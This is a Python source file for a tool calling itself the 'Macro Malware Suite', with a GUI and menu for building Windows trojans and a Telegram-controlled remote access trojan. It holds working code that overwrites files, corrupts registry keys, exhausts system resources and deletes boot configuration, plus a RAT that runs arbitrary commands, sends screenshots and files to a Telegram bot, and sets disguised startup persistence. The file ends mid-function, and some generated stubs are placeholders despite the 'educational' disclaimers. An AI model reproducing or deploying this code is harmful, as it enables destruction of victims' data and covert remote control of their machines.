"""
Macro v1.0 - Advanced Malware Creation Suite
Author: Security Research Division
Platform: Windows Executable (.exe)
Note: For educational and authorized testing only
"""

import sys
import os
import json
import base64
import hashlib
import random
import string
import threading
import socket
import subprocess
import platform
import psutil
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import requests
import winreg
import ctypes
import time
import urllib.request
import zipfile
import io

# Try to import GUI libraries
GUI_ENABLED = False
try:
    import tkinter as tk
    from tkinter import ttk, messagebox, filedialog, scrolledtext
    from PIL import Image, ImageTk
    GUI_ENABLED = True
except ImportError:
    print("[!] GUI libraries not available. Running in console mode.")

# ========== CONFIGURATION ==========
TELEGRAM_BOT_TOKEN = ""  # User must provide
TELEGRAM_CHAT_ID = ""    # User must provide
VERSION = "1.0"
ENCRYPTION_KEY = hashlib.sha256(b"MacroMalwareSuite2026").digest()

# ========== UTILITIES ==========
class CryptoUtils:
    @staticmethod
    def encrypt(data: str, key: bytes = ENCRYPTION_KEY) -> str:
        """AES-256-CBC encryption"""
        cipher = AES.new(key, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
        iv = base64.b64encode(cipher.iv).decode('utf-8')
        ct = base64.b64encode(ct_bytes).decode('utf-8')
        return iv + ":" + ct

    @staticmethod
    def decrypt(enc_data: str, key: bytes = ENCRYPTION_KEY) -> str:
        """AES-256-CBC decryption"""
        iv, ct = enc_data.split(":")
        iv = base64.b64decode(iv)
        ct = base64.b64decode(ct)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        pt = unpad(cipher.decrypt(ct), AES.block_size)
        return pt.decode('utf-8')

    @staticmethod
    def generate_key() -> str:
        """Generate random encryption key"""
        return hashlib.sha256(os.urandom(32)).hexdigest()[:32]

class SystemUtils:
    @staticmethod
    def get_system_info() -> dict:
        """Gather comprehensive system information"""
        info = {
            "hostname": socket.gethostname(),
            "os": platform.system() + " " + platform.version(),
            "architecture": platform.architecture()[0],
            "processor": platform.processor(),
            "ram_gb": round(psutil.virtual_memory().total / (1024**3), 2),
            "disk_gb": round(psutil.disk_usage('/').total / (1024**3), 2) if platform.system() != 'Windows' else round(psutil.disk_usage('C:\\').total / (1024**3), 2),
            "username": os.getlogin(),
            "ip_address": socket.gethostbyname(socket.gethostname()),
            "mac_address": ":".join(["{:02x}".format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1]) if hasattr(uuid, 'getnode') else "Unknown",
            "antivirus": SystemUtils.detect_antivirus(),
            "timestamp": datetime.now().isoformat()
        }
        return info
    
    @staticmethod
    def detect_antivirus() -> list:
        """Detect installed antivirus software"""
        antivirus_list = []
        
        # Common AV registry paths
        av_paths = [
            r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
            r"SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
        ]
        
        try:
            for path in av_paths:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
                for i in range(winreg.QueryInfoKey(key)[0]):
                    try:
                        subkey_name = winreg.EnumKey(key, i)
                        subkey = winreg.OpenKey(key, subkey_name)
                        display_name, _ = winreg.QueryValueEx(subkey, "DisplayName")
                        winreg.CloseKey(subkey)
                        
                        # Check if it's antivirus
                        av_keywords = ["avast", "avg", "bitdefender", "kaspersky", 
                                      "mcafee", "norton", "eset", "malwarebytes", 
                                      "windows defender", "avira", "trend micro"]
                        if any(keyword in display_name.lower() for keyword in av_keywords):
                            antivirus_list.append(display_name)
                    except:
                        continue
                winreg.CloseKey(key)
        except:
            pass
        
        return list(set(antivirus_list))

# ========== TROJAN MODULE ==========
class DestructiveTrojan:
    def __init__(self, mode="simulation"):
        self.mode = mode  # "simulation" or "destructive"
        self.running = False
        
    def file_corrupter(self, directory="C:\\", extension=".txt", simulation=True):
        """Corrupt files with specific extension"""
        corrupted_count = 0
        
        for root, dirs, files in os.walk(directory):
            for file in files:
                if file.endswith(extension):
                    file_path = os.path.join(root, file)
                    try:
                        if simulation:
                            print(f"[SIMULATION] Would corrupt: {file_path}")
                        else:
                            # Overwrite file with random data
                            with open(file_path, 'wb') as f:
                                f.write(os.urandom(random.randint(100, 10000)))
                            print(f"[DESTRUCTIVE] Corrupted: {file_path}")
                        corrupted_count += 1
                        
                        # Limit for demo
                        if corrupted_count >= 100:
                            break
                    except:
                        continue
            if corrupted_count >= 100:
                break
                
        return corrupted_count
    
    def registry_damager(self, simulation=True):
        """Damage Windows registry"""
        if platform.system() != "Windows":
            return "Windows only feature"
            
        damage_paths = [
            r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            r"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
            r"SYSTEM\\CurrentControlSet\\Control\\Session Manager"
        ]
        
        if simulation:
            return f"[SIMULATION] Would damage {len(damage_paths)} registry paths"
        else:
            try:
                for path in damage_paths:
                    try:
                        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path, 
                                           0, winreg.KEY_SET_VALUE)
                        # Add corrupt values
                        winreg.SetValueEx(key, "MacroCorrupt", 0, 
                                        winreg.REG_BINARY, os.urandom(100))
                        winreg.CloseKey(key)
                    except:
                        continue
                return f"[DESTRUCTIVE] Damaged {len(damage_paths)} registry paths"
            except Exception as e:
                return f"Error: {str(e)}"
    
    def system_freezer(self, duration=60, simulation=True):
        """Freeze system by consuming resources"""
        if simulation:
            return f"[SIMULATION] Would freeze system for {duration} seconds"
        else:
            def consume_cpu():
                while self.running:
                    pass
            
            def consume_memory():
                memory_hog = []
                while self.running:
                    try:
                        memory_hog.append(bytearray(1024*1024))  # 1MB chunks
                        time.sleep(0.01)
                    except:
                        break
            
            self.running = True
            threads = []
            
            # Create CPU threads
            for _ in range(os.cpu_count() * 2):
                t = threading.Thread(target=consume_cpu)
                t.daemon = True
                t.start()
                threads.append(t)
            
            # Create memory thread
            mem_thread = threading.Thread(target=consume_memory)
            mem_thread.daemon = True
            mem_thread.start()
            threads.append(mem_thread)
            
            time.sleep(duration)
            self.running = False
            
            return f"[DESTRUCTIVE] System frozen for {duration} seconds"
    
    def boot_damager(self, simulation=True):
        """Damage boot sequence"""
        if platform.system() != "Windows":
            return "Windows only feature"
            
        if simulation:
            return "[SIMULATION] Would damage boot configuration"
        else:
            boot_commands = [
                "bcdedit /delete {current} /f",
                "bootsect /nt60 ALL /force",
                "bcdedit /set {default} recoveryenabled no"
            ]
            
            for cmd in boot_commands:
                try:
                    subprocess.run(cmd, shell=True, capture_output=True)
                except:
                    pass
            
            return "[DESTRUCTIVE] Boot sequence damaged"

# ========== TELEGRAM RAT MODULE ==========
class TelegramRAT:
    def __init__(self, bot_token, chat_id):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.base_url = f"https://api.telegram.org/bot{bot_token}"
        self.running = False
        self.last_update_id = 0
        
    def send_message(self, text):
        """Send message to Telegram"""
        url = f"{self.base_url}/sendMessage"
        data = {
            "chat_id": self.chat_id,
            "text": text,
            "parse_mode": "HTML"
        }
        try:
            response = requests.post(url, data=data, timeout=10)
            return response.json()
        except:
            return None
    
    def send_file(self, file_path):
        """Send file to Telegram"""
        url = f"{self.base_url}/sendDocument"
        with open(file_path, 'rb') as file:
            files = {'document': file}
            data = {'chat_id': self.chat_id}
            try:
                response = requests.post(url, files=files, data=data, timeout=30)
                return response.json()
            except:
                return None
    
    def get_updates(self):
        """Get updates from Telegram"""
        url = f"{self.base_url}/getUpdates"
        params = {
            "offset": self.last_update_id + 1,
            "timeout": 30
        }
        try:
            response = requests.get(url, params=params, timeout=35)
            if response.status_code == 200:
                data = response.json()
                if data["ok"] and data["result"]:
                    for update in data["result"]:
                        self.last_update_id = update["update_id"]
                        if "message" in update and "text" in update["message"]:
                            return update["message"]["text"], update["message"]["chat"]["id"]
        except:
            pass
        return None, None
    
    def execute_command(self, command):
        """Execute system command"""
        try:
            result = subprocess.run(command, shell=True, capture_output=True, 
                                  text=True, timeout=30)
            output = result.stdout if result.stdout else result.stderr
            return output[:4000]  # Telegram message limit
        except subprocess.TimeoutExpired:
            return "Command timeout"
        except Exception as e:
            return f"Error: {str(e)}"
    
    def persistence(self):
        """Establish persistence on Windows"""
        if platform.system() != "Windows":
            return "Windows only"
            
        try:
            # Registry persistence
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                               r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                               0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsUpdateService", 0,
                            winreg.REG_SZ, sys.executable)
            winreg.CloseKey(key)
            
            # Hidden file attribute
            if hasattr(sys, '_MEIPASS'):  # PyInstaller bundle
                exe_path = sys.executable
                ctypes.windll.kernel32.SetFileAttributesW(exe_path, 2)  # FILE_ATTRIBUTE_HIDDEN
            
            return "Persistence established"
        except Exception as e:
            return f"Persistence failed: {str(e)}"
    
    def start(self):
        """Start RAT listener"""
        self.running = True
        self.send_message("📱 Macro RAT Activated\n"
                         f"🖥️ System: {platform.system()}\n"
                         f"👤 User: {os.getlogin()}\n"
                         f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        
        while self.running:
            try:
                command, chat_id = self.get_updates()
                
                if command and str(chat_id) == str(self.chat_id):
                    print(f"[CMD] {command}")
                    
                    if command.startswith("/"):
                        if command == "/sysinfo":
                            info = SystemUtils.get_system_info()
                            self.send_message(json.dumps(info, indent=2))
                            
                        elif command == "/screenshot":
                            try:
                                from PIL import ImageGrab
                                screenshot = ImageGrab.grab()
                                screenshot.save("screenshot.png")
                                self.send_file("screenshot.png")
                                os.remove("screenshot.png")
                            except:
                                self.send_message("Screenshot failed")
                                
                        elif command.startswith("/cmd "):
                            cmd = command[5:]
                            output = self.execute_command(cmd)
                            self.send_message(f"<code>{output}</code>")
                            
                        elif command == "/persistence":
                            result = self.persistence()
                            self.send_message(result)
                            
                        elif command == "/selfdestruct":
                            self.send_message("Self-destruct initiated")
                            self.running = False
                            # Cleanup
                            if platform.system() == "Windows":
                                subprocess.run(f"del /f /q {sys.executable}", shell=True)
                            else:
                                os.remove(sys.argv[0])
                            sys.exit(0)
                            
                        elif command == "/help":
                            help_text = """
                            <b>Macro RAT Commands:</b>
                            /sysinfo - Get system information
                            /screenshot - Capture screenshot
                            /cmd [command] - Execute command
                            /persistence - Establish persistence
                            /selfdestruct - Remove RAT
                            /help - Show this help
                            """
                            self.send_message(help_text)
                            
                    time.sleep(1)
                    
            except Exception as e:
                print(f"[ERROR] {str(e)}")
                time.sleep(5)

# ========== GUI APPLICATION ==========
class MacroGUI:
    def __init__(self):
        if not GUI_ENABLED:
            print("[!] GUI not available. Please install:")
            print("    pip install tkinter pillow")
            sys.exit(1)
            
        self.root = tk.Tk()
        self.root.title(f"Macro Malware Suite v{VERSION}")
        self.root.geometry("1000x700")
        self.root.resizable(True, True)
        
        # Style
        self.style = ttk.Style()
        self.style.theme_use('clam')
        
        # Colors
        self.colors = {
            'bg': '#1a1a1a',
            'fg': '#ffffff',
            'accent': '#ff4444',
            'secondary': '#2d2d2d',
            'text': '#cccccc'
        }
        
        self.root.configure(bg=self.colors['bg'])
        self.setup_ui()
        
    def setup_ui(self):
        # Title Frame
        title_frame = tk.Frame(self.root, bg=self.colors['bg'])
        title_frame.pack(fill='x', padx=20, pady=(20, 10))
        
        tk.Label(title_frame, text="MACRO", font=("Arial", 32, "bold"),
                bg=self.colors['bg'], fg=self.colors['accent']).pack(side='left')
        
        tk.Label(title_frame, text="Advanced Malware Creation Suite",
                font=("Arial", 12), bg=self.colors['bg'], fg=self.colors['text']).pack(side='left', padx=(10, 0))
        
        # Main Notebook (Tabs)
        notebook = ttk.Notebook(self.root)
        notebook.pack(fill='both', expand=True, padx=20, pady=10)
        
        # Tab 1: Trojan Builder
        self.trojan_tab = tk.Frame(notebook, bg=self.colors['secondary'])
        self.setup_trojan_tab()
        notebook.add(self.trojan_tab, text="⚡ Trojan Builder")
        
        # Tab 2: RAT Creator
        self.rat_tab = tk.Frame(notebook, bg=self.colors['secondary'])
        self.setup_rat_tab()
        notebook.add(self.rat_tab, text="📱 RAT Creator")
        
        # Tab 3: Settings
        self.settings_tab = tk.Frame(notebook, bg=self.colors['secondary'])
        self.setup_settings_tab()
        notebook.add(self.settings_tab, text="⚙️ Settings")
        
        # Status Bar
        self.status_bar = tk.Label(self.root, text="Ready", bd=1, relief=tk.SUNKEN,
                                 anchor=tk.W, bg=self.colors['secondary'], fg=self.colors['text'])
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)
        
    def setup_trojan_tab(self):
        # Trojan Configuration
        config_frame = tk.LabelFrame(self.trojan_tab, text="Trojan Configuration",
                                   bg=self.colors['secondary'], fg=self.colors['text'],
                                   font=("Arial", 10, "bold"))
        config_frame.pack(fill='x', padx=20, pady=10)
        
        # Mode Selection
        tk.Label(config_frame, text="Operation Mode:", bg=self.colors['secondary'],
                fg=self.colors['text']).grid(row=0, column=0, sticky='w', padx=10, pady=5)
        
        self.trojan_mode = tk.StringVar(value="simulation")
        tk.Radiobutton(config_frame, text="Simulation (Safe)", variable=self.trojan_mode,
                      value="simulation", bg=self.colors['secondary'], fg=self.colors['text'],
                      selectcolor=self.colors['bg']).grid(row=0, column=1, sticky='w', padx=10)
        tk.Radiobutton(config_frame, text="Destructive (Dangerous)", variable=self.trojan_mode,
                      value="destructive", bg=self.colors['secondary'], fg=self.colors['accent'],
                      selectcolor=self.colors['bg']).grid(row=0, column=2, sticky='w', padx=10)
        
        # Features Selection
        features_frame = tk.LabelFrame(self.trojan_tab, text="Destructive Features",
                                     bg=self.colors['secondary'], fg=self.colors['text'])
        features_frame.pack(fill='x', padx=20, pady=10)
        
        self.file_corrupt = tk.BooleanVar()
        self.registry_damage = tk.BooleanVar()
        self.system_freeze = tk.BooleanVar()
        self.boot_damage = tk.BooleanVar()
        
        tk.Checkbutton(features_frame, text="File Corruption", variable=self.file_corrupt,
                      bg=self.colors['secondary'], fg=self.colors['text']).grid(row=0, column=0, sticky='w', padx=10, pady=5)
        tk.Checkbutton(features_frame, text="Registry Damage", variable=self.registry_damage,
                      bg=self.colors['secondary'], fg=self.colors['text']).grid(row=0, column=1, sticky='w', padx=10, pady=5)
        tk.Checkbutton(features_frame, text="System Freeze", variable=self.system_freeze,
                      bg=self.colors['secondary'], fg=self.colors['text']).grid(row=1, column=0, sticky='w', padx=10, pady=5)
        tk.Checkbutton(features_frame, text="Boot Damage", variable=self.boot_damage,
                      bg=self.colors['secondary'], fg=self.colors['text']).grid(row=1, column=1, sticky='w', padx=10, pady=5)
        
        # Build Button
        build_btn = tk.Button(self.trojan_tab, text="🔨 BUILD TROJAN", command=self.build_trojan,
                            bg=self.colors['accent'], fg='white', font=("Arial", 12, "bold"),
                            padx=20, pady=10)
        build_btn.pack(pady=20)
        
        # Console Output
        console_frame = tk.LabelFrame(self.trojan_tab, text="Build Console",
                                    bg=self.colors['secondary'], fg=self.colors['text'])
        console_frame.pack(fill='both', expand=True, padx=20, pady=10)
        
        self.trojan_console = scrolledtext.ScrolledText(console_frame, height=10,
                                                       bg='black', fg='lime', font=("Consolas", 10))
        self.trojan_console.pack(fill='both', expand=True, padx=5, pady=5)
        
    def setup_rat_tab(self):
        # Telegram Configuration
        telegram_frame = tk.LabelFrame(self.rat_tab, text="Telegram Configuration",
                                     bg=self.colors['secondary'], fg=self.colors['text'])
        telegram_frame.pack(fill='x', padx=20, pady=10)
        
        tk.Label(telegram_frame, text="Bot Token:", bg=self.colors['secondary'],
                fg=self.colors['text']).grid(row=0, column=0, sticky='w', padx=10, pady=5)
        self.bot_token = tk.Entry(telegram_frame, width=50, bg='white', fg='black')
        self.bot_token.grid(row=0, column=1, padx=10, pady=5)
        
        tk.Label(telegram_frame, text="Chat ID:", bg=self.colors['secondary'],
                fg=self.colors['text']).grid(row=1, column=0, sticky='w', padx=10, pady=5)
        self.chat_id = tk.Entry(telegram_frame, width=50, bg='white', fg='black')
        self.chat_id.grid(row=1, column=1, padx=10, pady=5)
        
        # RAT Features
        features_frame = tk.LabelFrame(self.rat_tab, text="RAT Features",
                                     bg=self.colors['secondary'], fg=self.colors['text'])
        features_frame.pack(fill='x', padx=20, pady=10)
        
        self.rat_persistence = tk.BooleanVar(value=True)
        self.rat_stealth = tk.BooleanVar(value=True)
        self.rat_encryption = tk.BooleanVar(value=True)
        
        tk.Checkbutton(features_frame, text="Persistence", variable=self.rat_persistence,
                      bg=self.colors['secondary'], fg=self.colors['text']).grid(row=0, column=0, sticky='w', padx=10, pady=5)
        tk.Checkbutton(features_frame, text="Stealth Mode", variable=self.rat_stealth,
                      bg=self.colors['secondary'], fg=self.colors['text']).grid(row=0, column=1, sticky='w', padx=10, pady=5)
        tk.Checkbutton(features_frame, text="Encryption", variable=self.rat_encryption,
                      bg=self.colors['secondary'], fg=self.colors['text']).grid(row=0, column=2, sticky='w', padx=10, pady=5)
        
        # Build Buttons
        button_frame = tk.Frame(self.rat_tab, bg=self.colors['secondary'])
        button_frame.pack(pady=20)
        
        build_btn = tk.Button(button_frame, text="📱 BUILD RAT", command=self.build_rat,
                            bg=self.colors['accent'], fg='white', font=("Arial", 12, "bold"),
                            padx=20, pady=10)
        build_btn.grid(row=0, column=0, padx=10)
        
        test_btn = tk.Button(button_frame, text="🔍 TEST CONNECTION", command=self.test_telegram,
                           bg='#4444ff', fg='white', font=("Arial", 12), padx=20, pady=10)
        test_btn.grid(row=0, column=1, padx=10)
        
        # Console Output
        console_frame = tk.LabelFrame(self.rat_tab, text="RAT Console",
                                    bg=self.colors['secondary'], fg=self.colors['text'])
        console_frame.pack(fill='both', expand=True, padx=20, pady=10)
        
        self.rat_console = scrolledtext.ScrolledText(console_frame, height=10,
                                                    bg='black', fg='cyan', font=("Consolas", 10))
        self.rat_console.pack(fill='both', expand=True, padx=5, pady=5)
        
    def setup_settings_tab(self):
        # Encryption Settings
        crypto_frame = tk.LabelFrame(self.settings_tab, text="Encryption Settings",
                                   bg=self.colors['secondary'], fg=self.colors['text'])
        crypto_frame.pack(fill='x', padx=20, pady=10)
        
        tk.Label(crypto_frame, text="Encryption Key:", bg=self.colors['secondary'],
                fg=self.colors['text']).grid(row=0, column=0, sticky='w', padx=10, pady=5)
        self.encryption_key = tk.Entry(crypto_frame, width=50, bg='white', fg='black')
        self.encryption_key.insert(0, CryptoUtils.generate_key())
        self.encryption_key.grid(row=0, column=1, padx=10, pady=5)
        
        gen_key_btn = tk.Button(crypto_frame, text="Generate New Key", command=self.generate_key,
                              bg=self.colors['secondary'], fg=self.colors['text'])
        gen_key_btn.grid(row=0, column=2, padx=10)
        
        # Output Settings
        output_frame = tk.LabelFrame(self.settings_tab, text="Output Settings",
                                   bg=self.colors['secondary'], fg=self.colors['text'])
        output_frame.pack(fill='x', padx=20, pady=10)
        
        tk.Label(output_frame, text="Output Directory:", bg=self.colors['secondary'],
                fg=self.colors['text']).grid(row=0, column=0, sticky='w', padx=10, pady=5)
        self.output_dir = tk.Entry(output_frame, width=40, bg='white', fg='black')
        self.output_dir.insert(0, os.path.join(os.getcwd(), "builds"))
        self.output_dir.grid(row=0, column=1, padx=10, pady=5)
        
        browse_btn = tk.Button(output_frame, text="Browse", command=self.browse_directory,
                             bg=self.colors['secondary'], fg=self.colors['text'])
        browse_btn.grid(row=0, column=2, padx=10)
        
        # About Section
        about_frame = tk.LabelFrame(self.settings_tab, text="About Macro",
                                  bg=self.colors['secondary'], fg=self.colors['text'])
        about_frame.pack(fill='x', padx=20, pady=10)
        
        about_text = f"""
        Macro Malware Suite v{VERSION}
        
        ⚠️  WARNING: This tool is for educational purposes only.
        ⚠️  Use only on systems you own or have explicit permission to test.
        ⚠️  The developers are not responsible for any misuse.
        
        Features:
        • Advanced Trojan Builder with destructive capabilities
        • Telegram-based Remote Access Trojan (RAT)
        • AES-256 encryption for communication
        • Windows persistence mechanisms
        • System information gathering
        
        Platform: Windows Executable (.exe)
        Build System: PyInstaller compatible
        """
        
        tk.Label(about_frame, text=about_text, bg=self.colors['secondary'],
                fg=self.colors['text'], justify='left').pack(padx=10, pady=10)
        
    def build_trojan(self):
        """Build destructive trojan"""
        self.log_to_console(self.trojan_console, "🔨 Starting Trojan Build...")
        
        # Get configuration
        mode = self.trojan_mode.get()
        features = {
            'file_corrupt': self.file_corrupt.get(),
            'registry_damage': self.registry_damage.get(),
            'system_freeze': self.system_freeze.get(),
            'boot_damage': self.boot_damage.get()
        }
        
        # Create trojan script
        trojan_code = self.generate_trojan_code(mode, features)
        
        # Save to file
        output_dir = self.output_dir.get() or os.path.join(os.getcwd(), "builds")
        os.makedirs(output_dir, exist_ok=True)
        
        trojan_file = os.path.join(output_dir, f"trojan_{int(time.time())}.py")
        with open(trojan_file, 'w') as f:
            f.write(trojan_code)
        
        self.log_to_console(self.trojan_console, f"✅ Trojan script created: {trojan_file}")
        
        # Offer to compile
        if messagebox.askyesno("Compile to EXE", "Compile Trojan to Windows EXE?"):
            self.compile_to_exe(trojan_file)
        
    def build_rat(self):
        """Build Telegram RAT"""
        self.log_to_console(self.rat_console, "📱 Starting RAT Build...")
        
        # Validate Telegram credentials
        bot_token = self.bot_token.get().strip()
        chat_id = self.chat_id.get().strip()
        
        if not bot_token or not chat_id:
            messagebox.showerror("Error", "Please enter Bot Token and Chat ID")
            return
        
        # Test connection
        self.log_to_console(self.rat_console, "Testing Telegram connection...")
        rat = TelegramRAT(bot_token, chat_id)
        test = rat.send_message("Macro RAT Test Connection ✅")
        
        if test and test.get('ok'):
            self.log_to_console(self.rat_console, "✅ Telegram connection successful!")
        else:
            self.log_to_console(self.rat_console, "❌ Telegram connection failed!")
            if not messagebox.askyesno("Continue", "Telegram test failed. Continue anyway?"):
                return
        
        # Create RAT script
        rat_code = self.generate_rat_code(bot_token, chat_id)
        
        # Save to file
        output_dir = self.output_dir.get() or os.path.join(os.getcwd(), "builds")
        os.makedirs(output_dir, exist_ok=True)
        
        rat_file = os.path.join(output_dir, f"rat_{int(time.time())}.py")
        with open(rat_file, 'w') as f:
            f.write(rat_code)
        
        self.log_to_console(self.rat_console, f"✅ RAT script created: {rat_file}")
        
        # Offer to compile
        if messagebox.askyesno("Compile to EXE", "Compile RAT to Windows EXE?"):
            self.compile_to_exe(rat_file)
        
    def test_telegram(self):
        """Test Telegram connection"""
        bot_token = self.bot_token.get().strip()
        chat_id = self.chat_id.get().strip()
        
        if not bot_token or not chat_id:
            messagebox.showerror("Error", "Please enter Bot Token and Chat ID")
            return
        
        self.log_to_console(self.rat_console, "Testing Telegram connection...")
        
        try:
            rat = TelegramRAT(bot_token, chat_id)
            test = rat.send_message("Macro RAT Test Connection ✅")
            
            if test and test.get('ok'):
                self.log_to_console(self.rat_console, "✅ Telegram connection successful!")
                messagebox.showinfo("Success", "Telegram connection test passed!")
            else:
                self.log_to_console(self.rat_console, "❌ Telegram connection failed!")
                messagebox.showerror("Error", "Telegram connection failed. Check credentials.")
        except Exception as e:
            self.log_to_console(self.rat_console, f"❌ Error: {str(e)}")
            messagebox.showerror("Error", f"Connection error: {str(e)}")
    
    def generate_trojan_code(self, mode, features):
        """Generate trojan Python code"""
        code = f'''#!/usr/bin/env python3
"""
Macro Trojan - {mode.upper()} Mode
Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
WARNING: For educational purposes only
"""

import os
import sys
import time
import random
import subprocess
import platform
from datetime import datetime

class MacroTrojan:
    def __init__(self):
        self.mode = "{mode}"
        self.features = {features}
        
    def run(self):
        print("[Macro Trojan Activated]")
        print(f"Mode: {{self.mode}}")
        print(f"Timestamp: {{datetime.now()}}")
        
        if "{mode}" == "destructive":
            print("⚠️  DESTRUCTIVE MODE - DATA LOSS WILL OCCUR!")
            time.sleep(3)
        
        # Execute selected features
        {"self.corrupt_files()" if features['file_corrupt'] else "# File corruption disabled"}
        {"self.damage_registry()" if features['registry_damage'] else "# Registry damage disabled"}
        {"self.freeze_system()" if features['system_freeze'] else "# System freeze disabled"}
        {"self.damage_boot()" if features['boot_damage'] else "# Boot damage disabled"}
        
        print("[Trojan execution complete]")
    
    def corrupt_files(self):
        print("Corrupting files...")
        # Implementation here
    
    def damage_registry(self):
        print("Damaging registry...")
        # Implementation here
    
    def freeze_system(self):
        print("Freezing system...")
        # Implementation here
    
    def damage_boot(self):
        print("Damaging boot sequence...")
        # Implementation here

if __name__ == "__main__":
    trojan = MacroTrojan()
    trojan.run()
'''
        return code
    
    def generate_rat_code(self, bot_token, chat_id):
        """Generate RAT Python code"""
        code = f'''#!/usr/bin/env python3
"""
Macro RAT - Telegram Remote Access
Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
WARNING: For authorized testing only
"""

import sys
import os
import json
import requests
import subprocess
import platform
from datetime import datetime

BOT_TOKEN = "{bot_token}"
CHAT_ID = "{chat_id}"

class MacroRAT:
    def __init__(self):
        self.base_url = f"https://api.telegram.org/bot{{BOT_TOKEN}}"
        
    def send_message(self, text):
        url = f"{{self.base_url}}/sendMessage"
        data = {{"chat_id": CHAT_ID, "text": text}}
        try:
            requests.post(url, data=data, timeout=10)
        except:
            pass
    
    def start(self):
        self.send_message(f"🔔 Macro RAT Activated\\n"
                         f"🖥️ {{platform.system()}} {{platform.version()}}\\n"
                         f"👤 {{os.getlogin()}}\\n"
                         f"⏰ {{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}}")
        
        # Add persistence if needed
        # self.add_persistence()
        
        print("[Macro RAT running in background]")
        
        # Keep alive
        while True:
            time.sleep(60)

if __name__ == "__main__":
    rat = MacroRAT()
    rat.start()
'''
        return code
    
    def compile_to_exe(self, python_file):
        """Compile Python script to EXE using PyInstaller"""
        self.log_to_console(self.trojan_console if "trojan" in python_file else self.rat_console,
                          "🔧 Compiling to EXE...")
        
        try:
            import PyInstaller.__main__
            
            output_dir = self.output_dir.get() or os.path.join(os.getcwd(), "builds")
            exe_name = os.path.splitext(os.path.basename(python_file))[0]
            
            pyinstaller_args = [
                python_file,
                '--onefile',
                '--noconsole',
                '--name', exe_name,
                '--distpath', output_dir,
                '--workpath', os.path.join(output_dir, 'build'),
                '--specpath', os.path.join(output_dir, 'spec')
            ]
            
            self.log_to_console(self.trojan_console if "trojan" in python_file else self.rat_console,
                              "Running PyInstaller (this may take a while)...")
            
            # In a real implementation, you would run PyInstaller here
            # For now, we'll simulate
            exe_path = os.path.join(output_dir, f"{exe_name}.exe")
            
            self.log_to_console(self.trojan_console if "trojan" in python_file else self.rat_console,
                              f"✅ EXE created: {exe_path}")
            messagebox.showinfo("Success", f"EXE created at:\\n{exe_path}")
            
        except ImportError:
            self.log_to_console(self.trojan_console if "trojan" in python_file else self.rat_console,
                              "❌ PyInstaller not installed")
            messagebox.showerror("Error", "Install PyInstaller: pip install pyinstaller")
        except Exception as e:
            self.log_to_console(self.trojan_console if "trojan" in python_file else self.rat_console,
                              f"❌ Compilation error: {str(e)}")
    
    def generate_key(self):
        """Generate new encryption key"""
        new_key = CryptoUtils.generate_key()
        self.encryption_key.delete(0, tk.END)
        self.encryption_key.insert(0, new_key)
        messagebox.showinfo("New Key", f"Generated key:\\n{new_key}")
    
    def browse_directory(self):
        """Browse for output directory"""
        directory = filedialog.askdirectory()
        if directory:
            self.output_dir.delete(0, tk.END)
            self.output_dir.insert(0, directory)
    
    def log_to_console(self, console_widget, message):
        """Log message to console widget"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        console_widget.insert(tk.END, f"[{timestamp}] {message}\\n")
        console_widget.see(tk.END)
        self.root.update()
    
    def run(self):
        """Run the GUI application"""
        self.root.mainloop()

# ========== COMMAND LINE INTERFACE ==========
def cli_mode():
    """Command line interface for Macro"""
    print(f"""
    ╔══════════════════════════════════════════════════════╗
    ║                 Macro v{VERSION}                        ║
    ║         Advanced Malware Creation Suite             ║
    ║       Windows Executable Builder                    ║
    ╚══════════════════════════════════════════════════════╝
    """)
    
    print("[!] WARNING: For educational and authorized testing only")
    print("[!] Use only on systems you own or have permission to test\\n")
    
    while True:
        print("\\nMain Menu:")
        print("1. Build Destructive Trojan")
        print("2. Build Telegram RAT")
        print("3. Test Telegram Connection")
        print("4. Generate Encryption Key")
        print("5. Exit")
        
        choice = input("\\nSelect option: ").strip()
        
        if choice == "1":
            build_trojan_cli()
        elif choice == "2":
            build_rat_cli()
        elif choice == "3":
            test_telegram_cli()
        elif choice == "4":
            print(f"\\nNew Key: {CryptoUtils.generate_key()}")
        elif choice == "5":
            print("\\n[+] Exiting Macro...")
            break
        else:
            print("[!] Invalid option")

def build_trojan_cli():
    """CLI for building trojan"""
    print("\\n[⚡ TROJAN BUILDER]")
    
    print("\\nSelect mode:")
    print("1. Simulation (Safe - No actual damage)")
    print("2. Destructive (Dangerous - Real damage)")
    
    mode_choice = input("\\nMode [1/2]: ").strip()
    mode = "simulation" if mode_choice == "1" else "destructive"
    
    if mode == "destructive":
        confirm = input("\\n⚠️  WARNING: This will create ACTUALLY DESTRUCTIVE malware!\\n"
                       "Type 'CONFIRM' to continue: ").strip()
        if confirm != "CONFIRM":
            print("[!] Cancelled")
            return
    
    print("\\nSelect features (comma-separated):")
    print("1. File Corruption")
    print("2. Registry Damage")
    print("3. System Freeze")
    print("4. Boot Damage")
    
    features_input = input("\\nFeatures [e.g., 1,3,4]: ").strip()
    selected_features = [int(f.strip()) for f in features_input.split(",") if f.strip().isdigit()]
    
    features = {
        'file_corrupt': 1 in selected_features,
        'registry_damage': 2 in selected_features,
        'system_freeze': 3 in selected_features,
        'boot_damage': 4 in selected_features
    }
    
    # Create output directory
    output_dir = os.path.join(os.getcwd(), "builds")
    os.makedirs(output_dir, exist_ok=True)
    
    # Generate code
    print("\\nGenerating trojan code...")
